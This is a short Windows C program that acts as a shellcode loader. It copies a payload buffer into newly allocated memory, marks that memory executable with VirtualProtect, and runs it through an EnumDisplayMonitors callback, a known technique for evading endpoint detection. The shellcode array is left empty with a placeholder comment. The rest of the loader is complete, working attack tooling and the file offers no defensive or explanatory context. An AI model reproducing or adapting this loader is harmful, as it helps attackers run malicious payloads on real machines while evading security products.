#include <windows.h>

// Configuration
unsigned char payloadBuffer[] = { /* shellcode bytes go here */ };

// Monitor enumeration callback
BOOL CALLBACK MonitorEnumProc(
    HMONITOR hMonitor,
    HDC hdc,
    LPRECT lprcMonitor,
    LPARAM dwData
)
{
    // Execution path
    ((void(*)())dwData)();
    return TRUE;
}

int main()
{
    // 1. Allocate memory in current process
    SIZE_T payloadSize = sizeof(payloadBuffer);
    LPVOID localMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 2. Write payload bytes
    WriteProcessMemory(GetCurrentProcess(), localMem, payloadBuffer, payloadSize, NULL);

    // 3. Make memory executable
    DWORD oldProtect = 0;
    VirtualProtect(localMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // 4. Trigger execution via EnumDisplayMonitors callback
    EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)localMem);

    // 5. Cleanup
    VirtualFree(localMem, 0, MEM_RELEASE);
    return 0;
}
